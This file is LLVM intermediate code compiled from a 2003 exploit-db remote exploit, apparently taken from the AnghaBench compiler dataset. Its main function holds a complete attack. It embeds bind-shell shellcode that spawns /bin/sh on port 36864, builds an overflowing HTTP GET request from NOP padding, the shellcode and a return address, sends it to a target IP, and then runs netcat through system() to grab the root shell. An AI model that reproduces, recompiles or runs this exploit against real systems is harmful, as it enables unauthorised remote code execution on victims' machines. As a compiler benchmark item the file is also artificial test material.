; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21298.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21298.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8, i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"TARGET\00", align 1
@__const.main.ret = private unnamed_addr constant [9 x i8] c"\E8\C5\FF\BE\E8\C5\FF\BE\00", align 1
@__const.main.shellcode = private unnamed_addr constant [125 x i8] c"\EBn^)\C0\89F\10@\89\C3\89F\0C@\89F\08\8DN\08\B0f\CD\80C\C6F\10\10\88F\081\C01\D2\89F\18\B0\90f\89F\16\8DN\14\89N\0C\8DN\08\B0f\CD\80\89^\0CCC\B0f\CD\80\89V\0C\89V\10\B0fC\CD\80\86\C3\B0?)\C9\CD\80\B0?A\CD\80\B0?A\CD\80\88V\07\89v\0C\87\F3\8DK\0C\B0\0B\CD\80\E8\8D\FF\FF\FF/bin/sh\00", align 16
@.str.1 = private unnamed_addr constant [50 x i8] c"\0A%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\0A\00", align 1
@EXPLOIT = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"\0AUsage: %s [IP_ADDRESS]\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"\0AExample: %s 10.0.0.1 \0A\00", align 1
@.str.4 = private unnamed_addr constant [57 x i8] c"\0AOn success a r00tshell will be spawned on port 36864.\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@NOP = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [10 x i8] c" HTTP/1.0\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [15 x i8] c"\0Asocket error\0A\00", align 1
@DEST_PORT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [19 x i8] c"inet_aton problems\00", align 1
@.str.10 = private unnamed_addr constant [17 x i8] c"\0Aconnect failed\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"\0Asend error\0A\00", align 1
@.str.12 = private unnamed_addr constant [44 x i8] c"\0ANetwork Error - Full Payload Was NOT sent!\00", align 1
@.str.13 = private unnamed_addr constant [33 x i8] c"\0A\0ANumber of bytes sent: %d / %d\0A\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"\0AUsing netcat 'nc' to get the r00tshell on port 36864 ...!\0A\00", align 1
@.str.15 = private unnamed_addr constant [55 x i8] c"nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca [2100 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca [9 x i8], align 1
  %14 = alloca [125 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  %15 = bitcast [9 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.main.ret, i32 0, i32 0), i64 9, i1 false)
  %16 = bitcast [125 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([125 x i8], [125 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 125, i1 false)
  %17 = load i8*, i8** @EXPLOIT, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %28

21:                                               ; preds = %2
  %22 = load i8*, i8** @EXPLOIT, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i8* %22)
  %24 = load i8*, i8** @EXPLOIT, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i8* %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 @exit(i32 -1) #4
  unreachable

28:                                               ; preds = %2
  %29 = load i8*, i8** %10, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @setenv(i8* %29, i8* %32, i32 1)
  %34 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %35 = call i32 @memset(i8* %34, i8 signext 0, i32 2100)
  %36 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  store i8* %36, i8** %12, align 8
  %37 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %38 = call i32 @strcat(i8* %37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %7, align 4
  br label %39

39:                                               ; preds = %47, %28
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = icmp ult i64 %41, 1908
  br i1 %42, label %43, label %50

43:                                               ; preds = %39
  %44 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %45 = load i8*, i8** @NOP, align 8
  %46 = call i32 @strcat(i8* %44, i8* %45)
  br label %47

47:                                               ; preds = %43
  %48 = load i32, i32* %7, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %7, align 4
  br label %39

50:                                               ; preds = %39
  %51 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %52 = getelementptr inbounds [125 x i8], [125 x i8]* %14, i64 0, i64 0
  %53 = call i32 @strcat(i8* %51, i8* %52)
  %54 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %55 = getelementptr inbounds [9 x i8], [9 x i8]* %13, i64 0, i64 0
  %56 = call i32 @strcat(i8* %54, i8* %55)
  %57 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %58 = call i32 @strcat(i8* %57, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %59 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %60 = call i32 @strcat(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %61 = load i32, i32* @AF_INET, align 4
  %62 = load i32, i32* @SOCK_STREAM, align 4
  %63 = call i32 @socket(i32 %61, i32 %62, i32 0)
  store i32 %63, i32* %6, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %68

65:                                               ; preds = %50
  %66 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0))
  %67 = call i32 @exit(i32 1) #4
  unreachable

68:                                               ; preds = %50
  %69 = load i32, i32* @AF_INET, align 4
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  store i32 %69, i32* %70, align 4
  %71 = load i32, i32* @DEST_PORT, align 4
  %72 = call i32 @htons(i32 %71)
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %72, i32* %73, align 4
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %78 = call i32 @inet_aton(i8* %76, i32* %77)
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %83, label %80

80:                                               ; preds = %68
  %81 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %82 = call i32 @exit(i32 2) #4
  unreachable

83:                                               ; preds = %68
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %85 = call i32 @memset(i8* %84, i8 signext 0, i32 8)
  %86 = load i32, i32* %6, align 4
  %87 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %88 = call i32 @connect(i32 %86, %struct.sockaddr* %87, i32 4)
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %95

90:                                               ; preds = %83
  %91 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.10, i64 0, i64 0))
  %92 = load i32, i32* %6, align 4
  %93 = call i32 @close(i32 %92)
  %94 = call i32 @exit(i32 3) #4
  unreachable

95:                                               ; preds = %83
  %96 = load i32, i32* %6, align 4
  %97 = load i8*, i8** %12, align 8
  %98 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %99 = call i32 @strlen(i8* %98)
  %100 = call i32 @send(i32 %96, i8* %97, i32 %99, i32 0)
  store i32 %100, i32* %8, align 4
  %101 = load i32, i32* %8, align 4
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %108

103:                                              ; preds = %95
  %104 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %105 = load i32, i32* %6, align 4
  %106 = call i32 @close(i32 %105)
  %107 = call i32 @exit(i32 4) #4
  unreachable

108:                                              ; preds = %95
  %109 = load i32, i32* %6, align 4
  %110 = call i32 @close(i32 %109)
  %111 = load i32, i32* %8, align 4
  %112 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %113 = call i32 @strlen(i8* %112)
  %114 = icmp slt i32 %111, %113
  br i1 %114, label %115, label %117

115:                                              ; preds = %108
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.12, i64 0, i64 0))
  br label %117

117:                                              ; preds = %115, %108
  %118 = load i32, i32* %8, align 4
  %119 = getelementptr inbounds [2100 x i8], [2100 x i8]* %11, i64 0, i64 0
  %120 = call i32 @strlen(i8* %119)
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.13, i64 0, i64 0), i32 %118, i32 %120)
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i64 0, i64 0))
  %123 = call i32 @sleep(i32 3)
  %124 = call i32 @system(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.15, i64 0, i64 0))
  %125 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_aton(i8*, i32*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @system(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
